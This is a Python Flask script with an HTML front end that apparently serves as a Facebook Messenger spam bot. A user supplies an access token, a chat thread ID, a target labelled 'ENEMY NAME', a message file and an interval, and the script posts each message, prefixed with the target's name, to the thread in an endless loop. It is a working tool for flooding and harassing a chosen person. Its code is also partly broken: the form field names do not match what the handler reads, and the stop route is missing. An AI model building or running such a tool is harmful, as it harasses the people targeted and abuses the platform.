from flask import Flask, request
import requests
import os
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''
    
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐒𝐀𝐑𝐕𝐄𝐑 𝐊𝐀𝐌𝐄𝐄𝐍𝐀 𝐌𝐀𝐉𝐍𝐔</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */



label{
    color: Azure blue;
}

.file{
    height: 40px;
}
body{
    background-image: url('https://i.imgur.com/QaeCC13.jpeg');
    background-size: cover;
    background-repeat: no-repeat;
    color: white;

}
    .container{
      max-width: 350px;
      height: 600px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      box-shadow: 0 0 15px white;
            border: none;
            resize: none;
    }
        .form-control {
            outline: 1px red;
            border: 1px double white ;
            background: transparent; 
            width: 100%;
            height: 40px;
            padding: 7px;
            margin-bottom: 20px;
            border-radius: 10px;
            color: white;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: #888;
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i {
      margin-right: 5px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
  <h1 class="mt-3">𝗦𝗘𝗥𝗩𝗘𝗥 𝗠𝗔𝗦𝗧𝗘𝗥 𝐊𝐀𝐌𝐄𝐄𝐍𝐀 𝐌𝐀𝐉𝐍𝐔[𝐅𝐑𝐎𝐌 𝐏𝐀𝐓𝐇𝐀𝐍𝐈 𝐑𝐔𝐋𝐄𝐗]</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenFile" class="form-label">𝙎𝙀𝙇𝙀𝘾𝙏 𝙔𝙊𝙐𝙍 𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
              </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝙉𝙋 𝙁𝙄𝙇𝙀</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝗖𝗢𝗡𝗩𝗢 𝗨𝗜𝗗{𝗚𝗖/𝗜𝗕}</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝗘𝗡𝗘𝗠𝗬 𝗡𝗔𝗠𝗘</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝙏𝙄𝙈𝙀 (𝙎𝙀𝘾𝙊𝙉𝘿𝙎)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">𝗥𝗨𝗡</button>
    </form>
    <form method="post" action="/stop">
      <button type="submit" class="btn btn-danger btn-submit mt-3">𝗦𝗧𝗢𝗣</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; 𝗔𝗩𝗘𝗡𝗚𝗘𝗥 𝗥𝗨𝗟𝗘𝗫 𝗢𝗡 𝗙𝗜𝗥𝗘 </p>
    <p><a href="https://wa.me/+92 320 3972669" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 </a></p>
    <div class="mb-3">
      <a href="https://www.facebook.com/profile.php?id=1012510713&mibextid=LQQJ4d">𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏</a>
    </div>
  </footer>
</body>
</html>
 '''


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    app.run(debug=True)
